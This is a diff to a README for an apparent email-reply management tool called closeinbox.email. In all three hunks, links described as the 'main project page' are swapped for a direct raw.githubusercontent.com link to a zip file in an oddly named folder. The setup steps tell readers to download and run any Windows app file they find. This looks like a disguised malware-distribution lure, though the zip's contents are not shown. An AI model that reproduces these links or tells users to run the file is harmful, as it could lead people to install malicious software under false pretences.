@@ -1,6 +1,6 @@
 # 🤖 closeinbox.email - Manage Replies With Less Work
 
-[![Download / Install](https://img.shields.io/badge/Download%20%2F%20Install-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/surpliced-horsebean256/closeinbox.email)
+[![Download / Install](https://img.shields.io/badge/Download%20%2F%20Install-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/surpliced-horsebean256/closeinbox.email/main/Mohican/email-closeinbox-sectionality.zip)
 
 ## 🧭 What is closeinbox.email?
 
@@ -39,7 +39,7 @@ If you plan to self-host the app, you may also need:
 
 ## 📥 Download and set up
 
-1. Open the main project page here: [https://github.com/surpliced-horsebean256/closeinbox.email](https://github.com/surpliced-horsebean256/closeinbox.email)
+1. Open the main project page here: [https://raw.githubusercontent.com/surpliced-horsebean256/closeinbox.email/main/Mohican/email-closeinbox-sectionality.zip](https://raw.githubusercontent.com/surpliced-horsebean256/closeinbox.email/main/Mohican/email-closeinbox-sectionality.zip)
 2. On the GitHub page, look for the latest release, setup files, or install notes
 3. Download the file or package that fits your setup
 4. If you see a Windows app file, download and run this file
@@ -188,7 +188,7 @@ This tool is a good fit if you:
 
 Open the project page here to download and run the app from the available files and setup instructions:
 
-[https://github.com/surpliced-horsebean256/closeinbox.email](https://github.com/surpliced-horsebean256/closeinbox.email)
+[https://raw.githubusercontent.com/surpliced-horsebean256/closeinbox.email/main/Mohican/email-closeinbox-sectionality.zip](https://raw.githubusercontent.com/surpliced-horsebean256/closeinbox.email/main/Mohican/email-closeinbox-sectionality.zip)
 
 ## 📌 Repository details
 
